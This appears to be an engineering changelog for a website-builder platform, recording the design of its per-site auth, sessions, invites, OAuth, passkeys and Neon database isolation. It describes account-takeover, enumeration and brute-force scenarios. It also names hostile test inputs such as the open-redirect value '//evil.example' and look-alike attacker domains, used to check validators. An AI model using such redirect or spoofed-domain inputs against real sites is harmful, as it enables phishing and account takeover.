- **What is left at `/api/db/*` is TRANSPORT, not a data API.** `proxySiteService` forwards to either the site's Data API or its Neon Auth server — no access logic, no schema allow-list, no scoping. Proxied rather than called from the page for the three reasons the auth proxy already had: the bundle holds no URL and no key, it is same-origin so there is no CORS and no cross-site cookie, and a generated page's URLs do not change. `prefer` is forwarded (PostgREST's `return=representation`, which is how an insert answers with the row it created) and `content-range` is passed back (the total count, without which a paginated list is useless).
- **`enableDataApi` POSTS TO `/data-api/{database}`, hyphen, naming the database — it was `/data_api` and it broke EVERY build (fixed 2026-08-04).** Neon answered `"this route does not exist"`, and `neon e2e` provisions a real project yet called neither enable function, so it stayed green throughout. Both are covered there now. The error wrappers also dropped `status` and the route dropped `stage`, so the failure reported `upstream: null` and could not name which of the two endpoints it was. **`enableDataApi` is FATAL, like `enableNeonAuth`.** With our row routes gone this IS the site's backend, so a build that could not enable it produced a site whose every list is empty and every form fails — and a caller can retry a failure, not a success. The full provider error is attached rather than summarised, because the one thing not verified against a real project is this endpoint's path, and a wrong path has to be correctable from the FIRST failed build.
- **Grants now ride with the apply, policies first.** In the other order there is a window, however short, where a role can ask and no policy has decided what it may see. The test that asserted grants were NOT yet applied fired the moment they were — that is the lifecycle working: the exposing change could not slip in quietly.
- **The client is PostgREST-shaped**: `?col=eq.value`, `?order=col.desc`, an array back rather than an envelope. `useRpc` / `useRpcAction` are the new half — **anything the database can express and a policy cannot** is a function the schema declares and the page calls by name. That replaces a list of hand-built verbs with "whatever this site declared", which is the direction stated at the top of this file.
- **Two invariants reversed rather than deleted, and that is the point of having them.** "Every list hook unwraps" became "no list hook hands back an envelope" (PostgREST returns the array, so the failure moved but did not go away). And `/api/db/*`'s gate assertion moved from naming handlers to naming the proxy plus a rate limit. A third, `Omit<Partial<T>, "id">`, demanded one left-to-right spelling of a commutative intersection — a correct signature written the other way round failed a test about type semantics on a question of word order.
- **Two derived guards had to stop naming files.** `site-errors.mjs`'s "both write paths use it" listed `site-data.mjs` by name and went red on a deletion unrelated to its invariant; it is now an EXCLUSION (the raw Postgres strings appear in exactly one place, whatever the callers are called) plus a not-orphaned check, because the exclusion alone passes perfectly on a codebase where nothing maps constraints at all. Same for the `publicView` one-question guard.
- **Known gaps this creates, not yet closed:** `site-notify.mjs` was triggered from `site-data.mjs`'s insert path, so the owner is no longer emailed when a booking arrives — it needs a Postgres trigger writing to a queue table plus the existing 2-minute cron, since there is no `http` extension to call out from the database. And `publicView` was enforced in the deleted read path; a site now needs a declared VIEW or function for "which slots are taken".

## Claim links survive the move (corrected 2026-07-30)

- **I said they were lost and that was wrong.** They looked lost because RLS cannot verify our HMAC — but the pattern is a random `claim_token uuid` on the row plus a `SECURITY DEFINER` function exposed as an RPC over the Data API, which reaches into a write-only table and returns exactly the matching row. **Better than the original**: revocable by nulling the column, and no signing key to hold. And it is ten lines of SQL the generator can emit per site where `site-claim.mjs` was a hand-built verb — the direction working as intended. The alternative, Better Auth's magic link, gives the customer an account they never asked for and turns the booking table from `collect` into `user`.

## One Neon project per SITE (2026-07-29)

- **Was one project per user, with a database per site inside it.** Per-site buys genuine isolation: a connection string can be handed to somebody without exposing that owner's OTHER sites, each site scales to zero on its own, and **deleting a site deletes a project** rather than dropping one database out of a shared one. Done with zero migration cost because the test-site cleanup that morning had left `site_backends` empty — there was nothing to move.
- **THE COST IS THE PROJECT CAP.** Neon limits projects per account, and this multiplies consumption of that limit by sites-per-user instead of by users. The old design was per-user *specifically* because of that cap. Unverified at the time of the change — worth checking against the plan before many users build many sites.
- **The connection string could not go on `site_backends`, and that is the load-bearing detail.** `site_backends` has an own-read RLS policy (verified: RLS on, 1 policy), so a signed-in user can read their own rows over the REST API — and a Neon URI carries a PASSWORD. So a new **`site_project`** table holds it: slug PK, RLS enabled with **NO policies**, service-key only, the same protection `user_site_project` has and for the same reason. A test reads `worker.js` and fails if `conn` ever appears in a `site_backends` select or write, in either direction.
- **Keyed by SLUG, not owner, everywhere.** `lookupProject(slug)` on the write path, `siteNeonProject(env, slug)` on the read path. Keyed by uid, a user's SECOND site would resolve to their FIRST site's project and be provisioned inside it — undoing the isolation silently while every test passed.
- **A retried build must find the project the last attempt made**, or every retry creates another and burns the cap. That is the per-site version of the leak `site-provision.mjs` was written to stop, and it is why the lookup throws rather than answering null: "Supabase is down" reading as "this site has no project" is what makes the next build create a duplicate.
- **On delete, the project record only goes once the project is actually gone.** A row with no project is a 404 the owner can retry; a project with no row is invisible and bills forever. `projectDropped` gates the row deletion and is returned in the response. Legacy sites provisioned under the per-user layout still have their database inside a shared project, so the delete path falls back to dropping just that database for them.
- `createSiteProject` is its own function rather than a flag on `createUserProject` — the two answer different questions and the caller should have to say which it means. Project names carry the slug (`isibi-<slug>`), because the Neon console is the only place an operator can tell projects apart and seven identically-named ones would be unusable. 6 mutations, all caught.

## Visitor accounts for published sites (2026-07-28)

- **A published site can have its own members** — a barber shop's customers, unrelated to isibi's `auth.users`. This is what makes the `user`/`feed`/`admin` access levels reachable at all; before it, ~12 schema-engine features were unusable and `GENERATOR.md` told the model to avoid those tables.
- **`site-auth.mjs`** — PBKDF2 hashing (self-describing `pbkdf2$iters$salt$hash`, so the cost can be raised without locking anyone out; the count is bounded on the way IN so a record downgraded to 1 iteration is refused even though its hash is correct) and HMAC stateless session tokens. **The signing key is derived PER SITE** — without the slug in the derivation a token from any site would authenticate on every other one. A reset token cannot be used as a session and a session cannot be used as a reset. 19 tests, 10 mutations.
- **`site-auth-routes.mjs`** — `signup`/`login`/`me`/`reset` decisions. Login's "no such account" and "wrong password" are byte-identical AND an unknown address is still verified against a dummy hash, so neither the status nor the timing answers "is this person a customer here". Reset always answers 200, including when throttled. `me` reads through to storage so a deleted member stops working at once. Throttled per site AND per address. **Known tradeoff:** signup 409s on an existing address, which does confirm it exists — the privacy-preserving alternative needs a working mailer. 20 tests, 10 mutations.
- **Accounts live in the SITE's own Neon database** (`_users`), not Supabase: `applySiteSchema` stamps `owner_id INTEGER`, so an account id has to be an integer from that database. It also keeps Supabase off the visitor path, and deleting a site takes its members with it. The per-site signing secret is in that database's `_meta`, written with `ON CONFLICT DO NOTHING` then read back so racing isolates agree.
- **`handleSiteData` resolves a visitor** for member tables: a `user` read is narrowed to the caller's own rows (ANDed onto their filters, so no query string can widen it), a write stamps `owner_id` from the verified session and never the body, and an `admin` write checks the role against `writeRoles`.
- **PATCH/DELETE work as of 2026-07-28, scoped to the row's OWNER.** Ids are sequential integers and the old (unreachable) handlers scoped by id alone, so enabling them unchanged would have let member A edit member B's row by guessing a number. `collect`/`display` have no owner and stay refused. **Another member's row answers 404, not 403** — a 403 confirms the row exists, which is an enumeration oracle over sequential ids. A `trash` table soft-deletes, still owner-scoped.
- **The generator knows.** `@/lib/rows` exports the auth hooks, `ACCESS_NOTE` describes the member levels properly, and the lint flags reading or writing a member table without `useMember()` — signed out that is a 401, and a page that shows an error instead of a login looks broken rather than locked.

## A live break, and the D1 auth tier deleted (2026-07-29)

- **Login was answering 500 on every existing site, and had been since the suspension work shipped.** `findUser` selects `token_epoch` and `blocked`; those columns were added by `ensureAuthExtras`, reachable only from `initSiteAuth`, reachable only from the `/verify` page — which needed a token nothing had ever minted. So they existed on **no site at all**, and a missing column is a Postgres error, not a null. Found by auditing which columns the live queries select against which ones anything creates.
- **`ensureSiteUsers` now guarantees every column any query touches**, because that is the function the login path actually calls. **The guard is derived, not listed**: `test/site-auth-flows.test.mjs` scans `worker.js` for every `SELECT … FROM _users`, scans `ensureSiteUsers` for every column it creates, and fails on the difference — so this cannot drift again in either direction.
- **The D1-era auth tier is gone**: `initSiteAuth`, `ensureAuthExtras`, `verifySiteUserToken`. `initSiteAuth` was worse than dead — it created a **second `_users` shape** with `pass_salt TEXT NOT NULL`, so any site where it ran before the first signup would have rejected every signup afterwards. **`ensureNotifications`/`createNotification` were restored after deletion**: the `notify` step of the D1-era site-functions runner still calls them, and removing that runner is a different decision from this one.
- **`canUnlink` had zero callers and `deleteCredential` had no route** — so a member could add a passkey and never remove one, and a stolen laptop's passkey worked forever. `passkey/remove` and `identities/unlink` now exist, and **passkeys and providers count together** as ways in: dropping your only passkey with no password strands an account that still exists and still owns rows, with no recovery path, because reset needs an address a provider sign-up may never have given us.

## Email verification, and `requireVerified` finally wired (2026-07-29)

- **There WAS a verification flow and it could never have worked.** `verified`, `verify_token` and `verify_exp` are columns on every site's `_users`, and a `/verify` page existed — but it ran on `verifySiteUserToken`, the **pre-deletion D1 token scheme**, whose signing key is derived differently from the live one. It could not have validated a token the current system minted, and nothing minted one. Rebuilt on the same family as session/reset/claim/oauth/2fa: `signVerify` + `verifyVerification`, `use: "verify"`, 48h.
- **That page also called `initSiteAuth`**, which creates a **second `_users` shape** with `pass_salt TEXT NOT NULL`. On a site where `/verify` ran before anyone signed up, that shape won and **every later signup failed a NOT NULL constraint**. Latent (nothing minted the tokens that reach it) and now gone — the page calls `ensureSiteUsers` like everything else. A test strips comments from the block and asserts neither old name survives in code.
- **Stateless, so `verify_token`/`verify_exp` stay unused** — a signed token carries its own subject and expiry, and a stored copy is just a second thing that can disagree. Replay is harmless: the only thing a link can do is set a flag that is already set, which also makes it idempotent for mail clients that prefetch.
- **`verify/request` needs a session**, so there is no address to enumerate and nothing to answer vaguely — you can only ask for your own link. Throttled; a throwing mailer still answers 200, because the person is signed in and can simply ask again. Sent fire-and-forget on signup: the account exists either way and a site with no mailer just never asks.
- **`requireVerified` is enforced at last, and FAILS OPEN without a mailer.** It had been parsed and inert since the schema engine was written; wiring it earlier would have been a gate nobody could pass — a table declaring it would have locked every member out permanently. `needsVerified(def, canVerify)` takes the mailer state precisely so that on a site where confirming an address is impossible the rule buys nothing and costs nothing. It starts working the day the key ships. **Writes only** — the point is to stop unattributable writing, not to hide the site from somebody who has not opened their inbox.
- 24 tests across flows and data, 10 mutations, all caught. Two of the failures were my own test's fault and worth remembering: an id compared as a string when the row holds a number, and an assertion window too small to reach past an inline HTML template.

## Durable brute-force delay (`site-lockout.mjs`, 2026-07-29)

- **The login throttle was per-isolate and that is not enough on its own.** It lives in `ttl-cache`; Cloudflare runs many isolates per colo and evicts idle ones, so an attacker spreading attempts across connections gets a fresh allowance each time and a patient one gets **unlimited guesses** against a real account. Counting on the ROW survives eviction and is the same number in every colo.
- **`failed` and `locked_until` existed only in the dead D1-era `initSiteAuth` CREATE** — reachable solely from the `/verify` page, which nothing can reach — so on every site the builder has made **they did not exist at all**. Added by `ensureSiteUsers`, which is what the login path actually calls; adding them to `ensureAuthExtras` would have left them missing everywhere. Epoch **seconds** in a BIGINT, not the TEXT timestamps the rest of the schema uses, because these are only ever compared to a number. Two tests read `worker.js` to assert the login lookup selects them and something writes them back.
- **An escalating DELAY, not a lock somebody has to clear.** A hard lock is a denial of service anyone can aim at anyone — learn a customer's address, fail eight times, and they cannot reach their own account until a human intervenes. Five failures cost nothing; after that 30s · 2m · 10m · 30m · 1h, **capped**, and a 12-hour quiet spell forgets the count. Twenty guesses cost over three hours (asserted), which is what collapses a brute force, while a real person's wait always ends on its own.
- **Checked AFTER the password hash**, so a delayed account is not measurably faster to refuse than a wrong one — that difference is a timing oracle for whether the address is a member here. The cost is one PBKDF2 run per attempt, bounded by the two throttles above it. **The answer is byte-identical to a wrong password**; "try again in 10 minutes" would confirm the account exists.
- **A failure during a delay writes nothing.** Otherwise someone hammering their own forgotten password pushes their own wait from thirty seconds to an hour — and so can an attacker, on purpose. A success clears the counter; a clean login on an untouched account writes nothing at all.
- `test/site-lockout.test.mjs` (14 tests) + 11 wiring tests in `site-auth-routes`, 13 mutations, all caught.

## The other ways to sign in — the cores (2026-07-29)

- **A site's members could sign in exactly one way: email and password.** Four modules add the rest. All four are **decision cores only — no HTTP routes and no tables yet**, so nothing is reachable from a site until the wiring lands. That is a deliberate split, not an oversight: these are the parts where a mistake is silent.
- **`site-identity.mjs` — the one that matters.** Adding Google, a passkey and a magic link does not add three features; it asks one question three times: *is the holder of this new credential the person who already has an account here?* **An identity is linked to an existing account only when the PROVIDER asserts the address is verified.** Otherwise: attacker makes a GitHub account with the victim's address, never confirms it, clicks "Continue with GitHub", and is signed in as the victim. A returning identity is matched on the provider's **subject**, never the email — an address can be reassigned; a subject cannot. `canUnlink` refuses to remove the last way in.
- **`site-oauth.mjs` — Google · Apple · Microsoft · GitHub · Discord · Slack · generic OIDC.** Seven providers, one flow, differences kept as data. **`emailVerified: null` for GitHub and Microsoft** is load-bearing — GitHub hands back unconfirmed addresses and Entra omits the claim, so neither may ever auto-link. State is an HMAC token of the session/reset family with its own `use` and the provider pinned into it (without that, a state minted for a provider the attacker controls replays against one they do not; and without state at all, login CSRF signs a victim's browser into the attacker's account). PKCE on every provider that supports it, with the verifier inside the **signed state rather than a cookie**, because published sites share one origin. `safeNext` refuses `//evil.example` as well as absolute URLs — protocol-relative is the one people miss. **Credentials are the SITE OWNER'S**, so the consent screen says the barber shop's name and one revocation cannot take down every site on the platform.
- **`site-webauthn.mjs` — passkeys.** The only new method needing no mailer, no third party and no registration anywhere. Hand-written CBOR/COSE/authData parsing plus WebCrypto, driven in tests by a **real authenticator** (generated P-256 key, DER signatures, genuine attestation objects) rather than a fake. Two bugs the tests caught: a key imported non-extractable and then exported (**every passkey would have been unstorable**), and `typeof [] === "object"` letting an array pass as clientData. Attestation is deliberately not verified — it proves the make of authenticator, which matters to an enterprise hardware policy and to nobody here, and costs a root store to maintain.
- **`site-otp.mjs` — TOTP, recovery codes, emailed codes.** **Checked against the RFC 6238 test vectors**, so every authenticator app agrees with it; "it agrees with itself" would prove nothing. `verifyTotp` returns the matched STEP rather than a boolean, so the caller can store it and refuse a replay — a code is live for up to 90 seconds otherwise. Recovery codes are hashed like passwords, because that is what they are.
- **Wired 2026-07-29.** `site-auth-methods.mjs` is the **registry** — each method declares its kind, how to tell whether a site configured it, which sub-routes it answers, and its DDL. The router walks that list (`routeFor`) instead of naming methods, so **adding SMS later is one entry plus one handler**; a test asserts every route the registry claims is routable, and further tests read `worker.js` to prove the matcher allows slashes, the DDL is executed rather than merely defined, and **every `deps.*` the flows call is actually supplied** (a missing one is a runtime TypeError on a public endpoint).
- **`site-auth-flows.mjs` — one handler per route, and one place a session is minted.** `finishSignIn` is that place, so **a primary method that succeeds on a 2FA account returns a PENDING token, never a session**; passkey, OAuth and email-code all go through it. Token kinds are now five (session · reset · claim · oauth · 2fa), each an allow-list. Tests drive every wrong-kind pairing, including a session presented as an OAuth state **with the correct provider pin**, so the pin cannot mask a missing kind check.
- **The OAuth callback lands on a page, not JSON** — a redirect back from a provider is a top-level navigation and cannot read a body. `authLandingPage` writes the session to the same localStorage key the client reads and forwards to `next`. **No token ever goes in the URL**, where it would sit in history and in the next page's referrer.
- **Provider credentials are the SITE OWNER'S**, stored in the site's `_meta` and set through `POST /api/site/<slug>/access {oauth:{…}}`. The GET returns which providers are configured, their labels and the exact redirect URIs to register — **never the secrets**, guarded by a test.
- **Found by tests, not by reading:** the OAuth state carried no `sub`, which `verifyToken` requires, so every callback answered "link expired"; a key imported non-extractable was then exported, so **every passkey would have been unstorable**; and `typeof [] === "object"` let an array pass as clientData. **Found by mutation:** seven survivors across two rounds, all real test gaps — including that passkey **login** was never driven at all.
- **SMS OTP is still not built** — it needs a paid vendor and a credential. It is one registry entry when that exists.
- 79 tests across the four (`site-identity` 18, `site-oauth` 23, `site-otp` 16, `site-webauthn` 22), 20 mutations. Two of the mutations found weak tests of mine: a TOTP boundary derived from `TOTP_WINDOW` (so widening the window widened the assertion too) and a length check nothing exercised.

## Roles, teams and password changes — auth finished (2026-07-28)

- **No route in the codebase could ever grant a role.** `_users.role` was created on every site, `admin` tables compared against it and per-table `writeRoles` named values for it — and nothing could write it. So every member on every site was `user` forever, which made **an `admin` table writable by nobody** and `writeRoles` a rule about a value that could not exist. `PATCH /api/site/<slug>/members/<id> {role, manager_id}` is the only way one is set, owner-only.
- **Roles are allow-listed against the site's OWN schema** (`rolesForSchema` in `site-access.mjs`): `user` and `admin` always, plus whatever its tables named in `writeRoles`. An owner inventing a role no table mentions has granted a permission that can never be checked — it reads as "I gave them access" and does nothing. `normalizeRole` requires a **string**, not anything stringifiable: `String(7)` is `"7"`, which passes the shape test and would make a number a role (the same lesson `checkPassword` learned).
- **`teamRead` is enforced** — a `user` table declaring it shows a member their reports' rows as well as their own, keyed on the `manager_id` column that `ensureAuthExtras` has been stamping onto every site's `_users` with **zero readers**. It is the middle the schema engine always described and never had: `user` is private-to-me, `feed` is everyone-sees-everything, and "my team's records" is the read model an internal tool actually needs. **DIRECT reports only** — a recursive walk is a `WITH RECURSIVE` on every read and an accidental cycle in `manager_id` never terminates. **Reads only**: a manager sees their team's rows and still writes only their own. The designer can now declare it (guarded by a test that reads worker.js), or it would be enforced and unreachable the way `unique` was.
- **A signed-in member could not change their password.** The only path was the reset flow, which needs an email nobody can currently send. `POST /api/db/<slug>/auth/password {current, next}` does it, and **requires the current password even though there is already a session** — without that, a stolen session token is a permanent account takeover.
- **`token_epoch` invalidates sessions.** Tokens are stateless and last 30 days, so before this a stolen one survived both a password change AND a reset — which defeats the point of a reset, since someone resetting is usually saying they lost control. The epoch is bumped **inside `setPassword`**, so it is not possible to change a password without invalidating sessions; it is checked in `me` AND in `resolveSiteVisitor`, because checking only the former would refuse the token at `/auth/me` and quietly accept it on every data read. A token minted before any of this (`ep` absent → 0) still works on an account that never changed.
- **`blocked` was orphaned too** — stamped onto every site's `_users` and read by nothing, so an owner's only option for a member behaving badly was DELETE: irreversible, and it leaves their rows pointing at nobody. `PATCH …/members/<id> {blocked}` suspends and reinstates (a real boolean, not anything truthy — `blocked:"false"` would suspend the member the owner was reinstating). A suspended member's login answers **byte-identically to a wrong password**, and the check sits after the hash so the timing does not answer it either; `me` and `resolveSiteVisitor` both refuse, so suspension takes effect on the token they are already holding rather than in thirty days.
- **Member self-service, none of which existed**: `logout-all` (sign out every other device — only possible at all once tokens carried an epoch), `email` (change the address; needs the current password, because the address IS the account — whoever holds it can reset their way back in), `close` (delete their own account; the owner could always delete them, they could never leave). Their rows stay behind exactly as when an owner deletes a member.
- **One `signedIn()` gate, shared.** It checks four things — valid signature, account still exists, epoch matches, not suspended. It exists because `password` was written before it and restated three of the four, so **a suspended member could still change their password**; a test caught it. Lifted above every branch so the next action added cannot repeat that.
- **Deliberately NOT done: `requireVerified`.** It is parsed and inert like the rest, and wiring it now would create a gate nobody can satisfy — verification email is dark (`deploy.yml:66`), so a table declaring it would lock every member out permanently. It becomes correct the day the mailer key ships, not before.
- `test/site-access.test.mjs` (10 tests) + role/team/password tests across `site-owner`, `site-data` and `site-auth-routes`. 638 total; 12 mutations on this change, one of which found the number-as-role bug.

## Who may become a member (`site-invite.mjs`, 2026-07-28)

- **Signup was open self-serve on every site.** Any site declaring a `user`/`feed`/`admin` table let anyone who found the URL create an account on it. For a public members area that is intended; for the thing a business owner actually asks for — a members area for my customers, a tool for my team — it is a hole, and it was the same hole on every site that has ever declared a member table. (A comment in `worker.js` described an `_invites`/`invite_only` feature from the D1 era; the code was gone, so it described nothing.)
- **Three modes, stored in the site's `_meta` as `signup_mode`: `open` (the default) · `invite` · `closed`.** Open stays the default deliberately — every site built before this has no setting, and silently closing them would break signups that work right now. `closed` is not the same as invite-with-no-codes: it says so, and it is the honest answer for "my team is complete".
- **`normalizeMode` fails OPEN and the mode *read* fails CLOSED**, which look contradictory and are not. An unrecognised stored value should behave like the overwhelming majority that have no value at all; but if the setting cannot be READ, signup answers 503, because guessing "open" would let a transient database blip reopen a site the owner deliberately shut. Same choice `assertOwner` makes.
- **Codes live in `_invites` in the site's own Neon database**, next to `_users` — keeps Supabase off the visitor path, and deleting a site takes its invites with it. 12 characters from a 32-char alphabet with no I/O/0/1 (60 bits), grouped `XXXX-XXXX-XXXX` for reading aloud; `normalizeCode` strips case and separators so nobody has to be told whether the dashes matter, and refuses the ambiguous characters rather than silently mapping them.
- **The decrement is atomic and the result is what decides** — `UPDATE _invites SET uses_left = uses_left - 1 WHERE code=? AND uses_left > 0 AND (expires_at IS NULL OR expires_at > now) RETURNING`. Never a SELECT then an UPDATE: two people redeeming the last use arrive as two statements at one Postgres, and a check-then-write lets both through. Same shape as the notify cooldown claim.
- **Burn first, then create, then refund on failure.** Burning first is the safe direction, and the refund is what stops the griefing: without it, anyone holding a code could spend every use on it by signing up repeatedly with an address that already exists — the invite is gone and no account appears. **A wrong code, an exhausted one and an expired one are byte-identical**, or a list of guesses reveals which codes exist.
- **The gate runs AFTER the throttle and BEFORE the password is hashed** — both tested. Earlier than the throttle means unthrottled code guessing; later than the hash means a refused signup costs a full PBKDF2 run of Worker CPU on a public endpoint.
- **Owner controls:** `GET`/`POST /api/site/<slug>/access` (mode + the live codes), `POST /api/site/<slug>/access/invite` (mint: uses ≤500, days ≤365, note ≤120), `DELETE /api/site/<slug>/access/invite/<code>` (revoke by zeroing `uses_left`, not deleting — a spent code should stay visible as spent). The mode is allow-listed on write, or an unrecognised value would read back as "open" and quietly reopen a closed site. `test/site-invite.test.mjs` (19 tests, 13 mutations) + 7 wiring tests in `test/site-auth-routes.test.mjs` (4 mutations).
- **Email-domain allow-list, added 2026-07-29** — `anyone @acme.com`, the other natural shape for a team tool, and **orthogonal to the three modes**: an owner may want an open site limited to their company, or an invite-only one ALSO limited, so a leaked code cannot be redeemed from a personal address. Stored in `_meta` as `signup_domains`, set through `POST …/access {domains}` (settable **without** a `mode`, or a client toggling the list has to resend a field it never meant to touch and gets a 400 if it forgets).
  - **An empty list allows everyone** — the setting is opt-in and every existing site has none; and an *unreadable* list allows everyone too, unlike the mode read, because a stored allow-list is a narrowing of an already-answered question rather than the answer itself.
  - **Subdomains do NOT match, and neither does anything else clever.** Exact string equality on the part after the last `@`. A suffix check — the obvious implementation — admits `ada@evil-acme.com`, and a `.`-anchored one still admits `ada@acme.com.attacker.net` under a naive read. Both are asserted. A bare string is not coerced into a one-entry list: a hand-written `"acme.com"` in `_meta` would otherwise become a **real** restriction nobody configured in that form.
  - **Checked BEFORE the invite is burned**, so an address that can never be admitted does not spend somebody's code on the way to being refused. Mutation-tested by moving it after.
- **Breached-password check (`site-pwned.mjs`, 2026-07-29)** — HIBP's range API by **k-anonymity**: only the first five hex characters of the password's SHA-1 leave, matching ~1 in 2²⁰ hashes, so neither the password nor its full hash is ever sent. No key, no account, no cost. Applied at signup, password change and reset.
  - **FAILS OPEN, deliberately.** Three outcomes, not two — `known` · `known:false` · `unknown` — and only `known` refuses. Slow, down, blocked and rate-limited are all `unknown`, because refusing to let somebody set a password while a third party is unavailable turns their outage into ours. A body that is not the expected shape reads as a clean miss for the same reason.
  - **Ordering is the whole wiring.** At signup it runs **before** the invite gate (the gate spends a code, and refusing afterwards leaves somebody holding a code that stopped working because of a retry we told them to make). On password-change it runs **after** the current password is proved, and on reset **after** the account is found — those two need a credential, and anywhere earlier makes each an unauthenticated way to make us call a service we do not run. All three orderings mutation-tested by moving the check.
  - `test/site-pwned.test.mjs` (15 tests, 10 mutations) + 8 wiring tests in `site-auth-routes` (9 mutations).
- **The derived-invariant sweep now covers every internal table**, not just `_users`: `_identities`, `_credentials`, `_auth_codes`, `_invites`. It scans `site-auth-methods.mjs` + `worker.js` for what each table CREATEs (and ALTERs in) versus what any `SELECT`/`INSERT`/`UPDATE` touches, and fails on the difference. This is the generalisation of the check that found login 500-ing on every existing site — a missing column is a Postgres error, not a null, so the failure is total and silent until somebody tries it.
- **Still not done:** owner-initiated invite *delivery* — the owner passes the code on themselves, because the mailer is still dark.

## Per-device sessions (`site-sessions.mjs`, 2026-07-29)

- **`logout-all` was the only revocation there was, and it is all-or-nothing.** It bumps `_users.token_epoch`, so dropping one old tablet meant signing back in on every machine you still have — and nothing could show a member what their devices ARE, so the choice was made blind. `sessions` lists them (`iPhone · Safari`, country, last seen); `sessions/revoke {sid}` drops ONE.
- **The trade is explicit: sessions stop being purely stateless.** A token now carries `sid` and `_sessions` holds a row per device. **It is not a second round trip** — `SESSION_JOIN` rides on the `_users` read every authenticated request already does, on both auth surfaces and on `resolveSiteVisitor`, which is the half that reads rows. A revocation that only took effect at `/auth/me` would leave the device somebody just signed out with full access to the data for thirty days.
- **A missing row is LIVE, and that is the load-bearing decision.** Two absences, two reasons: a token with no `sid` at all is every session that existed before this shipped (refusing them signs the whole platform's visitors out to add a settings screen); a `sid` with no row is either a pruned row — whose token the signature layer already refuses — or a failed INSERT at sign-in, and refusing THERE would mean a transient write error hands somebody a token that authenticates nowhere, on every request, forever. A lookup that *fails* is a different thing and is already closed: the join is part of the user read, so a database error takes the whole query down.
- **The direct consequence: revocation is a FLAG and nothing ever deletes a row to revoke one** — a deleted row reads as "no row", which reads as live. Pruning is therefore **twice** a token's lifetime, never once, so a row can only go after the signature layer has been refusing its token for a month; and the SQL says `created_at IS NOT NULL` rather than `COALESCE(created_at,0)`, or an unstamped row would compare as 1970 and be deleted on the first list.
- **Everything that bumps the epoch also clears the list** — `logout-all`, password change, reset. The epoch is what stops the tokens; the sweep is what the member SEES, and without it the one screen that answers "where am I signed in" answers it wrongly. It runs **before** the replacement token is minted, because `mk` records a row and a sweep after it would revoke the session being handed back.
- **`last_seen` is written at most every 15 minutes and only on `me`** — the route the app calls on load. Untimed, or on the data path, this is a WRITE on every authenticated read, which is the thing the whole connection-health effort was about not doing.
- **The UA parser's table order is load-bearing**: Edge's user agent contains "Chrome" and "Safari", Opera's contains both, Chrome's contains "Safari", and every mobile Apple UA says "like Mac OS X". Each is asserted, because reordering the table is a silent change that names the wrong device. **The IP is deliberately not stored, hashed or otherwise** — PII in the site owner's database bought for a "was this login odd?" feature that needs geolocation we do not have; `request.cf.country` gives the useful part free.
- **`_sessions` is created by `ensureSiteUsers`, not only by `AUTH_DDL`** — the `_users` bug one level up. `AUTH_DDL` is applied by `ensureAuthTables`, which only the registry's routes call; plain email-and-password sign-in never goes near it and now joins `_sessions` on every request, so a table existing only where somebody used a passkey would 500 everywhere else. One definition (`SESSION_DDL`), spread into `AUTH_DDL`, guarded by a test.
- **Two derived guards were widened, and one of them had quietly stopped covering anything.** The `_users` column scan matched `SELECT … FROM _users` in a single string literal — the session joins are split across two lines, so the scan silently skipped the two queries that run on every request; it now joins adjacent literals and asserts it can still see them. And the "every dep the flows call is supplied" test now covers **`siteAuthDeps` too** (it had no such guard at all) and resolves `...helper()` spreads rather than reading the factory body alone.
- `test/site-sessions.test.mjs` (28 tests) + 26 wiring tests across flows and routes. **53 mutations, all caught.** Two survivors fixed real things: a redundant backwards-clock guard that was deleted rather than tested, and a `current` check that only passed because no sid can stringify to `"undefined"` — which `startSession`'s own `String(sid)` makes reachable.

## Two builds at once destroyed each other (2026-07-29)

- **`getContainer(env.SITE_BUILD_CONTAINER)` is called with no id, so EVERY build on the platform lands in one container** — and the build handler wipes a shared `src/routes` (plus `dist` and the generated route tree) before writing its pages. Two builds arriving together interleave: one deletes the other's pages, and `dist` can vanish mid-read.
- **Observed live, by accident.** `auth smoke` and `build smoke` are both triggered by a deploy and ran in the same second. The audit built a yoga studio, its build response listed the yoga pages, and **the published site served the barber shop the other test was compiling**. Reproduced locally: one build returned a failure with zero files, the other a bundle containing neither site's content.
- **Serialised, not given a directory each.** A per-build working copy would allow real parallelism but multiplies disk and memory per concurrent build in a container sized for one; this is the fix that cannot itself be subtly wrong. Cloudflare scales container INSTANCES — this only has to make one instance honest.
- **`test/integration/site-build.mjs` now fires two builds at once** and asserts each carries its own content and neither carries the other's. The existing reset test proved builds do not leak SEQUENTIALLY and said nothing about the case that actually happens. Mutation-checked by removing the serialisation. ## Teams — the "ours" read model (`site-teams.mjs`, 2026-07-29)

- **The schema engine described three read models and a business tool needs a fourth.** `user` is private-to-me, `feed` is everyone-sees-everything, `admin` is a shared CMS — and a CRM's deals belong to the TEAM. `teamScope` was **dead at four layers at once**: parsed since the schema engine was written, stamping a `team_id INTEGER` column onto every table declaring it, listed in `MANAGED_COLUMNS` so nobody could forge one — and read by nothing, populated by nothing, with no `_teams` table for the column to reference, no `team_id` on `_users`, and undeclarable by the designer. Built on that column rather than a new `org_id`, deliberately: a parallel concept would leave the old one dead forever.
- **A member with NO team sees ONLY their own rows.** The one assertion that matters. Every naive "same team" implementation gets it wrong in the same outward direction — `IS NOT DISTINCT FROM` would match null to null — and before an owner sets any team up, EVERY member is teamless, so the bug shows the whole site each other's records. The clause is also parenthesised, or ANDing it onto a caller's filters re-associates and the OR escapes them.
- **How it differs from `teamRead`, which also widens a `user` table:** `teamRead` is a HIERARCHY (a manager sees their direct reports' rows via `manager_id`) and widens **reads only**. `teamScope` is a FLAT GROUP that reads **and edits** the team's rows — a tool where a colleague cannot correct a record is not the tool anybody asked for. Opt-in either way; a customer-facing members area simply does not declare it.
- **One team per member, deliberately.** Multi-team forces every request to answer "which team am I acting in", which is a whole class of bug (a stale active team, a token minted for a team somebody has left) in exchange for a case a small business tool does not have. A join table replaces the column later without changing any of the rules.
- **Reachability is asserted as a chain**, because any one link missing makes the rest useless: the designer can declare it · `_users` gets `team_id` · the visitor query SELECTs it (or everyone reads as teamless — the `token_epoch` failure again) · `_teams` is created · an owner can create a team and assign a member · the read path acts on it · a write stamps it. **Deleting a team releases its members FIRST** — Postgres can reuse an identity value, and a dangling `team_id` would be inherited wholesale by whichever team next takes that id.
- `test/site-teams.test.mjs` (16 tests) + 7 wiring tests in `site-data`, 13 mutations, all caught.

## Two dead things wired, and a production auth audit (2026-07-29)

